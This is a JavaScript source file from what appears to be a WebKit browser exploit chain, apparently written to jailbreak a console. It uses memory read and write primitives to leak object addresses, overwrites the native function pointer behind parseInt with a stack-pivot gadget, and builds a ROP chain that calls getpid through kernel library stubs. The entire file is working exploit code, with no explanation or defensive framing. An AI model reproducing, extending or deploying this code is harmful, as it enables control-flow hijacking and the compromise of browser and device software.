/**
 * Stub page fire — G0 pivot + ROP stack (direct lk stub @ parseInt OOMs on 13.52).
 */
import { int64 } from "./int64.js";
import {
    prepNativeChain, firePivotGetpid,
    bisectDisarmG0,
} from "./native_call.js?v=nc-20250831r";
import { captureParseIntMainMf, loadStubCap } from "./stub_call.js?v=stub-7";

let g0Prep = null;

function stubStep(opts, tag, detail) {
    if (opts && opts.log) opts.log(tag, detail || "");
    if (opts && opts.flush) opts.flush();
    try {
        sessionStorage.setItem("wk-stub-last-step", tag + (detail ? " " + detail : ""));
    } catch (_) { }
}

function parseStoredHex(v) {
    if (v == null) return NaN;
    if (typeof v === "number" && Number.isFinite(v)) return v;
    if (typeof v === "string") {
        const s = v.replace(/^0x/i, "").trim();
        if (!s || !/^[0-9a-f]+$/i.test(s)) return NaN;
        if (s.length <= 8) return parseInt(s, 16) >>> 0;
        const lo = parseInt(s.slice(-8), 16) >>> 0;
        const hi = parseInt(s.slice(0, -8), 16) >>> 0;
        return lo + hi * 0x100000000;
    }
    return NaN;
}

function webkitBaseFromCap(cap, off) {
    try {
        const raw = sessionStorage.getItem("wk-webkitBase");
        if (raw) {
            const s = String(raw).replace(/^0x/i, "").trim();
            if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
            if (s.length < 16) return new int64(parseInt(s.slice(-8), 16) >>> 0, 0);
            return new int64(
                parseInt(s.slice(-8), 16) >>> 0,
                parseInt(s.slice(0, -8), 16) >>> 0);
        }
    } catch (_) { }
    const fn = cap && cap.nativeFn;
    if (!fn || !off) return null;
    const rva = off.wk_parseint_native || off.wk_expm1_builtin;
    if (!rva) return null;
    return fn.sub32(rva);
}

function resolveCap(p, off, opts) {
    if (opts.reuseCap && opts.reuseCap.mainMf) return opts.reuseCap;
    const cached = loadStubCap();
    if (cached && cached.mainMf) return cached;
    return captureParseIntMainMf(p, off, opts);
}

function buildCapForPrep(p, off, carrier, cap) {
    let pivotCell = null;
    const ta = carrier && carrier.textarea;
    if (ta) {
        try { pivotCell = p.leakval(ta); } catch (_) { pivotCell = null; }
    }
    if (!pivotCell && carrier && carrier.textareaAddress) {
        const n = parseStoredHex(carrier.textareaAddress);
        if (Number.isFinite(n))
            pivotCell = new int64(n >>> 0, Math.floor(n / 0x100000000) >>> 0);
    }
    return {
        mainMf: cap.mainMf,
        mainOrig: cap.mainOrig,
        nativeFn: cap.nativeFn || cap.mainOrig,
        pivotTrigger: parseInt,
        pivotBuiltinName: "parseint-g0",
        pivotObj: ta || {},
        pivotCell: pivotCell || p.leakval(ta || {}),
    };
}

export function ensureG0Prep(p, off, lk, opts) {
    if (g0Prep) return g0Prep;
    const carrier = opts.carrier || (typeof window !== "undefined" ? window._wkCarrier : null);
    if (opts.preTrim) {
        try { opts.preTrim(); stubStep(opts, "G0-TRIM", "ok"); } catch (e) {
            stubStep(opts, "G0-TRIM-WARN", e.message || String(e));
        }
    }
    const cap = resolveCap(p, off, opts);
    const wb = webkitBaseFromCap(cap, off);
    if (!wb) throw new Error("g0: no webkitBase — Start/2e first");
    stubStep(opts, "G0-PREP", "slab build wb=" + wb);
    const prepCap = buildCapForPrep(p, off, carrier, cap);
    g0Prep = prepNativeChain(p, off, wb, prepCap);
    g0Prep._stubCap = cap;
    if (opts.retain && g0Prep.keepAlive) {
        for (let i = 0; i < g0Prep.keepAlive.length; i++)
            opts.retain.push(g0Prep.keepAlive[i]);
    }
    if (typeof window !== "undefined") window._stubG0Prep = g0Prep;
    stubStep(opts, "G0-PREP-OK", "S=" + g0Prep.M.S + " G0=" + g0Prep.G.G0);
    return g0Prep;
}

/** N5a — G0 @ mainMf, parseInt(1), no hook. Survived = pivot entry OK. */
export function fireG0Smoke(p, off, opts) {
    opts = opts || {};
    const cap = resolveCap(p, off, opts);
    const wb = webkitBaseFromCap(cap, off);
    if (!wb) throw new Error("g0 smoke: no webkitBase");
    const g0 = wb.add32(off.wk_MOV_RDI_RSI_30_CALL);
    stubStep(opts, "G0-SMOKE-ARM", "G0=" + g0);
    p.write8(cap.mainMf, g0);
    stubStep(opts, "G0-SMOKE-FIRE", "parseInt(1) no hook");
    let err = null;
    try {
        parseInt(1);
    } catch (e) {
        err = e;
    } finally {
        try {
            p.write8(cap.mainMf, cap.mainOrig);
            stubStep(opts, "G0-SMOKE-RESTORE", "ok");
        } catch (re) {
            stubStep(opts, "G0-SMOKE-RESTORE-FAIL", re.message || String(re));
        }
    }
    if (err) throw err;
    return { path: "g0-smoke", cap };
}

/** G0 + cell30 hook + getpid stack — proper native entry. */
export function fireG0Getpid(p, off, lk, opts) {
    opts = opts || {};
    if (!lk) throw new Error("g0 getpid: need lk");
    const prep = ensureG0Prep(p, off, lk, opts);
    const stubOff = (off.k_stubs && off.k_stubs[20] != null) ? off.k_stubs[20] : 0x2cb70;
    stubStep(opts, "G0-GETPID-FIRE", "stubOff=0x" + stubOff.toString(16) + " lk=" + lk);
    const pid = firePivotGetpid(p, prep, lk, off, stubOff, {
        hook: opts.hook || "cell30",
        carrier: opts.carrier || null,
    });
    stubStep(opts, "G0-DONE", "pid=" + pid);
    return { path: "g0-getpid", pid, prep };
}

export function disarmStubG0(p) {
    if (!g0Prep || !p) return;
    try {
        bisectDisarmG0(p, g0Prep);
    } catch (_) {
        try {
            if (g0Prep.mainMf && g0Prep.mainOrig != null)
                p.write8(g0Prep.mainMf, g0Prep.mainOrig);
        } catch (_2) { }
    }
}

export function resetG0Prep() {
    g0Prep = null;
    if (typeof window !== "undefined") window._stubG0Prep = null;
}
